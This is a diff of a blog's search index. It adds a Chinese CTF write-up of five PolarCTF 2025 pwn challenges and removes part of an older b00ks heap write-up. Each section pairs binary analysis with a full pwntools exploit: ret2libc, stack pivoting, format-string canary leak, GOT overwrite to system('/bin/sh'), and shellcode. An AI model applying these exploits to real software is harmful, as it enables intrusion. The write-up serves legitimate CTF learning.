@@ -1,6 +1,119 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>PolarCTF2025春季个人挑战赛——部分WP</title>
+    <url>/posts/42e0/</url>
+    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>这是polarctf2025春季个人挑战赛——栈溢出部分，堆系列有两道搞不懂，先放出来这些，后面继续学堆去咯~</p>
+<blockquote>
+<p>题目附件：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t1YmFuc2VjL3B3bi90cmVlL21haW4vcG9sYXJjdGYyMDI1X1NwcmluZw==">https://github.com/kubansec/pwn/tree/main/polarctf2025_Spring<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="koi"><a href="#koi" class="headerlink" title="koi"></a>koi</h1><p>知识点：</p>
+<ul>
+<li>ret2read</li>
+<li>ret2libc</li>
+</ul>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，64位小端，只开了NX保护：</p>
+<p><img src="/./images/p9/image.png"></p>
+<p>IDA中打开</p>
+<p><img src="/./images/p9/image-2.png"></p>
+<p>switch()只会进行一次，所以不用想肯定是利用存在栈溢出的这个wrshell()函数，注意wrshell()中read只能溢出一个字长，也就是只能覆盖rbp。</p>
+<p>看到if判断</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( v4 == 520 &amp;&amp; n == 520 )</span><br><span class="line"> &#123;</span><br><span class="line">   puts(&quot;GOOD&quot;);</span><br><span class="line">   xxx();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>我们要进入这个xxx()函数，得满足<code>v4 == 520 &amp;&amp; n == 520</code>这个条件，v4是我们输入的，我们需要再修改n的值为520，由于只有一次scanf的机会，所以想到在scanf的时候，同时给v4和n读入520。<br>观察scanf前的处理</p>
+<p><img src="/./images/p9/image-6.png"></p>
+<p>var_4是<code>地址-4</code>，<code>call scanf</code>前将rbp-4的地址赋给rax，作为scanf拟写入的参数，而rbp是我们可以随意覆盖的。<br>由于我们想要修改的变量n的地址在<code>0x60108C</code>，所以将rbp覆盖为<code>0x60108C+4</code>。</p>
+<p><img src="/./images/p9/image-3.png"></p>
+<p>这样一来scanf读入v4的值的同时，n也会写入同样的值。<br><em>这种攻击手法称为栈迁移中return2read攻击</em></p>
+<p>接着顺利进入<code>xxx()</code>：</p>
+<p><img src="/./images/p9/image-7.png"></p>
+<p>有0x100的溢出空间，常规泄露地址打ret2libc即可。</p>
+<p>这里泄露puts和read的地址，在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到对应的libc直接打就行</p>
+<p><img src="/./images/p9/image-8.png"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./koi&quot;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span><br><span class="line">n_addr = 0x60108c</span><br><span class="line">xxx_addr = 0x4009CE</span><br><span class="line">rdi = 0x400a63</span><br><span class="line">ret = 0x4005d9</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">payload = cyclic(0x50) + p64(n_addr + 0x4)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;520&#x27;)</span><br><span class="line"></span><br><span class="line"># 泄露puts</span><br><span class="line">io.recv() </span><br><span class="line">elf = ELF(&#x27;./koi&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 泄露read</span><br><span class="line">io.recv()</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) +p64(rdi) + p64(read_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x80e50</span><br><span class="line">system_addr = libc_base + 0x50d70</span><br><span class="line">binsh_addr = libc_base + 0x1d8678</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(binsh_addr) + p64(ret) +  p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="bllhl-mom"><a href="#bllhl-mom" class="headerlink" title="bllhl_mom"></a>bllhl_mom</h1><p>知识点：</p>
+<ul>
+<li>格式化字符串漏洞泄露canary</li>
+<li>栈迁移</li>
+</ul>
+<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先checksec看一下<br><img src="/./images/p9/image-9.png"><br>32位小端，开启了canary和NX保护.</p>
+<p>IDA中看到，漏洞函数mom()确实存在canary，并且这个canary位于<code>ebp-0xc</code>的位置</p>
+<p><img src="/./images/p9/image-11.png"></p>
+<p>mom()中有三次read，均存在漏洞:</p>
+<p><img src="/./images/p9/image-10.png"></p>
+<p>第一个read只能输5字节，存在格式化字符串漏洞，可以泄露栈上信息，那么就用他来泄露canary，调试中算一下偏移是<code>%23$p</code>;</p>
+<p><img src="/./images/p9/image-12.png"></p>
+<p>第二个和第三个read均可以溢出2个字长，因为溢出字节很少，只能栈迁移到栈上.<br>那么第二个read就是用来泄露ebp的值，第三个read用来栈迁移。</p>
+<blockquote>
+<p>跟<code>ciscn_2019_es_2</code>这道题有点像，感兴趣可以去读我的这篇文章<a href="https://kubansec.github.io/posts/6e43/?highlight=%E6%A0%88%E8%BF%81%E7%A7%BB">栈迁移学习总结</a></p>
+</blockquote>
+<p>因为程序中有system，但没有<code>/bin/sh</code>，所以需要在栈中部署<code>/bin/sh</code>，最终布置的栈结构和栈帧的变化如图所示：</p>
+<p><img src="/./images/p9/image-13.png"></p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./bllhl_mom&#x27;)</span><br><span class="line">elf = ELF(&#x27;./bllhl_mom&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">io.recv()</span><br><span class="line">io.send(b&#x27;%23$p&#x27;)</span><br><span class="line">canary = int(io.recv(10),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">io.send(cyclic(0x50))</span><br><span class="line">io.recvuntil(b&#x27;taaa&#x27;)</span><br><span class="line">ebp = u32(io.recv(4))</span><br><span class="line">print(hex(ebp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">leave_ret = 0x0804861f</span><br><span class="line">system_addr = 0x08048490</span><br><span class="line">binsh_addr = ebp - 0x50</span><br><span class="line">canary_addr = ebp - 0xc</span><br><span class="line">payload = b&#x27;AAAA&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x44,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload = payload.ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(ebp-0x60) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><p>知识点：</p>
+<ul>
+<li>ret2libc</li>
+</ul>
+<h2 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，32位程序，只开了NX保护<br><img src="/./images/p9/image-14.png"></p>
+<p>IDA 里面看到是一个非常简单的栈溢出<br><img src="/./images/p9/image-15.png"></p>
+<p>那么直接泄露地址，打ret2libc就可以了。可以多泄露几个函数，交叉查询就不用一个一个去尝试了</p>
+<p>在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到libc<br><img src="/./images/p9/image-18.png"></p>
+<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./libc&#x27;)</span><br><span class="line">elf = ELF(&#x27;libc&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">jiu_addr = 0x08048561</span><br><span class="line"></span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(puts_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">puts_addr = u32(io.recv(4))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">read_addr = u32(io.recv(4))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x0732a0</span><br><span class="line">sys_addr = libc_base +  0x048170</span><br><span class="line">binsh_addr = libc_base + 0x1bd0d5</span><br><span class="line">payload = cyclic(58+4) + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="fmt-text"><a href="#fmt-text" class="headerlink" title="fmt_text"></a>fmt_text</h1><p>知识点：</p>
+<ul>
+<li>格式化字符串漏洞</li>
+<li>劫持got表</li>
+</ul>
+<h2 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，32位，开启canary和NX保护，<code>RELRO:      Partial RELRO</code>代表got表可写<br><img src="/./images/p9/image-20.png"></p>
+<p>IDA里面分析：</p>
+<p><img src="/./images/p9/image-21.png"></p>
+<p>yichu函数存在两次格式化字符串漏洞</p>
+<p>测一下偏移，偏移为6：</p>
+<p><img src="/./images/p9/image-23.png"></p>
+<p>并且存在system函数:<br><img src="/./images/p9/image-22.png"></p>
+<p>那么思路就是利用第一次格式化字符串漏洞将printf的got表指针指向system函数，第二次发送<code>/bin/sh</code>构造<code>printf(&#39;/bin/sh&#39;)</code>，程序就会执行<code>system(&#39;/bin/sh&#39;)</code>了</p>
+<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./fmt_text&#x27;)</span><br><span class="line">elf = ELF(&#x27;fmt_text&#x27;)</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_plt&#125;) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="bllbl-shellcode-2"><a href="#bllbl-shellcode-2" class="headerlink" title="bllbl_shellcode_2"></a>bllbl_shellcode_2</h1><p>知识点：</p>
+<ul>
+<li>ret2shellcode</li>
+</ul>
+<h2 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，64位，保护全关，既然NX保护是关的，意味着可以用ret2shellcode打。<br><img src="/./images/p9/image-25.png"></p>
+<p>IDA里面看到yichu函数发生溢出，并且直接把写入的地址给我们了。</p>
+<p><img src="/./images/p9/image-26.png"></p>
+<p>还给了我们<code>jsp rsp</code>指令</p>
+<p><img src="/./images/p9/image-29.png"></p>
+<p>那么思路就是将shellode写到栈上去，利用<code>jsp rsp</code>指令跳转到shellcode写入地址，执行shellcode即可。</p>
+<p>这里再讲一下偏移，下断点到read处，输入<code>aaaaaaaa</code>：</p>
+<p><img src="/./images/p9/image-24.png"></p>
+<p>看到他是从<code>rsi-3</code>的位置开始写入的，那么写入<code>13个字节 ( = 16 - 3)</code>就能覆盖到返回地址。</p>
+<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;bllbl_shellcode_2&#x27;)</span><br><span class="line"></span><br><span class="line">jmp_rsp = 0x401380</span><br><span class="line">binsh_addr = 0x402047</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">buf_addr = int(io.recv(12),16)</span><br><span class="line">success(&#x27;buf_addr = &gt;&gt;&gt; 0x%x&#x27; % buf_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&quot;&quot;&quot;</span><br><span class="line">mov al,0x3b;</span><br><span class="line">mov esi,edi</span><br><span class="line">mov edi,0x402047</span><br><span class="line">mov edx,esi</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">shellcode += p64(jmp_rsp)</span><br><span class="line">shellcode += asm(&quot;&quot;&quot;</span><br><span class="line">sub rsp,21;   # 13+8</span><br><span class="line">jmp rsp</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, &#x27;b *0x401376&#x27;)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzI1MDJfOTEyNjkyMTYvYXJ0aWNsZS9kZXRhaWxzLzE0NjQ1MzU2NA==">https://blog.csdn.net/2502_91269216/article/details/146453564<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW0zWG5ZNkVBNQ==">https://www.bilibili.com/video/BV1m3XnY6EA5<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>PolarCTF</tag>
+        <tag>koi</tag>
+        <tag>bllhl_mom</tag>
+        <tag>bllbl_shellcode_2</tag>
+        <tag>libc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/posts/3eeb/</url>
     <content><![CDATA[<p>Welcome to <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvLw==">Hexo<i class="fa fa-external-link-alt"></i></span>! This is your very first post. Check <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv">documentation<i class="fa fa-external-link-alt"></i></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=">troubleshooting<i class="fa fa-external-link-alt"></i></span> or you can ask me on <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==">GitHub<i class="fa fa-external-link-alt"></i></span>.</p>
@@ -16,99 +129,6 @@
 <h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
 <p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s">Deployment<i class="fa fa-external-link-alt"></i></span></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>【buuCTF刷题】asis2016_b00ks</title>
-    <url>/posts/b08e/</url>
-    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
-<p>题目链接： <span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2FzaXMyMDE2X2IwMGtz">https://buuoj.cn/challenges#asis2016_b00ks<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p>2016年的题花了好几天时间才做出来，遂记录一下。<br>通过这道题学习到很多知识点，如off-by-one、钩子函数（malloc_hook和free_hook）的利用，还有就是——当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展，而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</p>
-<span id="more"></span>
-
-
-<h1 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h1><p>进入程序，先输入一个作者名，跳出目录<br><img src="/./images/p7/image.png"></p>
-<p>依次尝试，根据输出预定义一下对应函数</p>
-<ol>
-<li><p>Create a book<br>进入创建要输入name_size , name , des_size , des<br> <img src="/./images/p7/image-1.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Delete a book<br> 删除功能直接输入book_id就可以了，Book_id可以在打印功能中看到<br> <img src="/./images/p7/image-2.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def delete(book_id):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(id))</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-<li><p>Edit a book<br> 编辑功能输入要编辑的Book_id，然后编辑内容<br> <img src="/./images/p7/image-3.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def edit(book_id,des):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>
-
-</li>
-<li><p>Print book detail<br> 打印所有书的信息，包括作者<br> <img src="/./images/p7/image-4.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Print():</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br></pre></td></tr></table></figure>
-
-</li>
-<li><p>Change current author name<br> 切换作者，也是直接输入新作者名就可以<br> <img src="/./images/p7/image-5.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def change(author):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,author)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p>放入IDA里面，对一些函数进行重命名<br><img src="/./images/p7/image-6.png"><br>先看scanf_author函数，通过前面的运行测试我们能猜出来大概是输入作者名的函数，点进去看到确实是让我们输入作者名<br><img src="/./images/p7/image-7.png"><br>是通过调用scanf_to_ptr的函数输入作者名，并且有两个参数，第一个参数off_202018其实是data段上的一个指针<br><img src="/./images/p7/image-9.png"><br>点进去函数看一下<br><img src="/./images/p7/image-8.png"><br>可以看到，通过循环变量i向off_202018这个指针的地址读入作者名，第二个参数在 i=&#x3D;a2 判断中作为循环终止的条件，注意到i是从0开始变化，如果循环条件是 i&#x3D;&#x3D;a2 ，这个循环实际上会执行33次，就导致作者名的长度是33个字节，有一个字节的溢出。<br><strong>scanf_to_ptr的函数存在off-by-one漏洞</strong></p>
-<h2 id="Create-a-book"><a href="#Create-a-book" class="headerlink" title="Create a book"></a>Create a book</h2><p>首先输入name_size的大小，然后根据size分配书名的堆，并把堆地址给ptr_name。如果堆空间分配成功，则向此堆中写入书名（第21行）<br><img src="/./images/p7/image-11.png"><br>注意写入书名调用的是scanf_to_ptr函数，我们分析过这个函数的功能是向第一个参数对应的空间写入内容，并且这个函数存在off-by-one漏洞。</p>
-<p>同样的操作，再输入desc_size，根据size再分配一个堆给书的内容<br><img src="/./images/p7/image-12.png"><br>如果堆空间分配成功，则调用漏洞函数scanf_to_ptr向堆中写入书的内容</p>
-<p>接下来看这里，分配了一个0x20的空间给一个变量，而这个变量其实存着一个结构体<br><img src="/./images/p7/image-13.png"></p>
-<p>第56、58、59、60行描述了结构体的成员变量，根据这些信息还原一下结构体是这样的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;               </span><br><span class="line">    int id;          </span><br><span class="line">    char *name;                 </span><br><span class="line">    char *description;          </span><br><span class="line">    int description_size; </span><br><span class="line">&#125; Book;</span><br></pre></td></tr></table></figure>
-<p>可以看到，程序用一个结构体去描述图书的信息</p>
-<p>57行将结构体的地址赋给了off_202010指针，而这个地址我们之前见过一次。在main函数的一开始，我们<strong>在off_202018指针指向的地址存放了作者名，在off_202010指针指向的地址存放图书结构体</strong><br><img src="/./images/p7/image-17.png"><br><strong>注意黄色标注的区域，作者名在超过0x20——也就是32个字节后，就会来到off_202010指针所指的空间。我们在前面分析知道，作者名是通过scanf_to_ptr函数读入，而这个函数存在off_by_one漏洞，导致作者名有一个字节的溢出，而这个溢出则会直接覆盖off_202010的第一个低字节。</strong><br>如果我们给作者名输入32个字符，因为字符串是\x00结尾，所以\x00会作为第33个字符溢出到off_202010的第一个低字节。</p>
-<h2 id="Delete-a-book"><a href="#Delete-a-book" class="headerlink" title="Delete a book"></a>Delete a book</h2><p>delete函数通过free释放空间，并且置为0，不存在UAF漏洞<br><img src="/./images/p7/image-15.png"></p>
-<h2 id="Change-current-author-name"><a href="#Change-current-author-name" class="headerlink" title="Change current author name"></a>Change current author name</h2><p>改变作者时，scanf_to_ptr同样是向off_202018的空间读入作者名<br><img src="/./images/p7/image-16.png"></p>
-<h2 id="Efit-和-Print"><a href="#Efit-和-Print" class="headerlink" title="Efit 和 Print"></a>Efit 和 Print</h2><p>这两个函数没什么特殊的<br><img src="/./images/p7/image-18.png"><br><img src="/./images/p7/image-19.png"></p>
-<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-替换libc"><a href="#1-替换libc" class="headerlink" title="1.替换libc"></a>1.替换libc</h2><p>由于是2016年的题，本地环境很难与远程环境一致，我这里用patchelf换了ubuntu 16的libc和ld，进行动态调试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./b00ks</span><br><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./b00ks </span><br></pre></td></tr></table></figure>
-<p>ldd验证一下<br><img src="/./images/p7/image-20.png"></p>
-<h2 id="2-动态调试-泄露book1-addr"><a href="#2-动态调试-泄露book1-addr" class="headerlink" title="2.动态调试 &amp;&amp; 泄露book1_addr"></a>2.动态调试 &amp;&amp; 泄露book1_addr</h2><p>在动态调试之前可以先把ASLR保护关掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">//重启机器后ASLR保护会自动打开    </span><br></pre></td></tr></table></figure>
-
-<p>gdb r 调试运行程序，输入作者名时输入32个字节<br><img src="/./images/p7/image-21.png"><br>ctrl+c 进入调试<br><img src="/./images/p7/image-22.png"><br>记录起始地址0x555555400000，作者名在偏移off_202018处，定位到作者名地址，<strong>绿框中的\x00其实是作者名溢出的字节</strong><br><img src="/./images/p7/image-24.png"></p>
-<p>按c回到程序中，创建一本书名和内容大小均为10的图书<br><img src="/./images/p7/image-25.png"><br>ctrl+c 进入调试，看看内存布局<br><img src="/./images/p7/image-26.png"><br>发现在作者名后面紧跟上了一个地址，根据静态分析我们推测这个地址指向刚刚创建的图书结构体，跟进去看的确如此<br><img src="/./images/p7/image-27.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555607460 = 图书结构体 = book1_id</span><br><span class="line">0x0000555555607468 = book1_name</span><br><span class="line">0x0000555555607470 = book1_desc</span><br><span class="line">0x0000555555607478 = book1_desc_size</span><br></pre></td></tr></table></figure>
-<p>并且，由于author和存放图书结构体的地址是挨着的，当我们print作者名的时候，由于没有\x00截断，也会把图书结构体地址泄露出来<br><img src="/./images/p7/image-44.png"><br><img src="/./images/p7/image-45.png"><br>通过下面的脚本泄露book1_addr</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(10,b&#x27;AAAA&#x27;,10,b&#x27;aaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br></pre></td></tr></table></figure>
-
-
-<p>根据前面的分析，如果我们向作者名输入32个字符，会溢出\x00,然后覆盖黄框中的地位\x60为\x00<br><img src="/./images/p7/image-26.png"></p>
-<p>验证一下，回到程序中，重新输入32个字节的作者名<br><img src="/./images/p7/image-28.png"><br>再查看内存，确实地位被覆盖为了\x00<br><img src="/./images/p7/image-29.png"><br>此时，程序会认为0x0000555555607400是book1结构体的地址（也是book1_id）<br><img src="/./images/p7/image-31.png"><br>而此时，这里什么都没有，显然这里是存在漏洞的，那该怎么利用呢？<br><strong>多试几次我们会发现，根据我们输入的name_size和desc_size的不同，图书结构体的地址会发生变化</strong><br>当name_size&#x3D;64，desc_size&#x3D;32时<br><img src="/./images/p7/image-33.png"><br>当name_size&#x3D;256，desc_size&#x3D;32时<br><img src="/./images/p7/image-34.png"></p>
-<h2 id="3-fake-book的故事"><a href="#3-fake-book的故事" class="headerlink" title="3.fake_book的故事"></a>3.fake_book的故事</h2><p>如果我们进行适当的调整，让book1_desc的地址的低位是\x00，比如在我当前环境下name_size&#x3D;208，desc_size&#x3D;32时内存是这样的<br><img src="/./images/p7/image-36.png"><br>此时book1_desc在0x0000555555607500这个地址，我们可以通过edit功能修改这里的内容</p>
-<p>为什么要这样做呢？想想off_by_one漏洞的利用，我们说过我们可以通过change_author，输入32个字节让他溢出<br><img src="/./images/p7/image-37.png"><br>导致上图中红色框框的地址低位变为\x00<br><img src="/./images/p7/image-38.png"><br>现在再来看看是什么情况?现在程序认为黄色标注的才是他的book1<br><img src="/./images/p7/image-39.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555607500 = book1_id</span><br><span class="line">0x555555607508 = book1_name</span><br><span class="line">0x555555607510 = book1_desc</span><br><span class="line">0x555555607518 = book1_desc_size</span><br></pre></td></tr></table></figure>
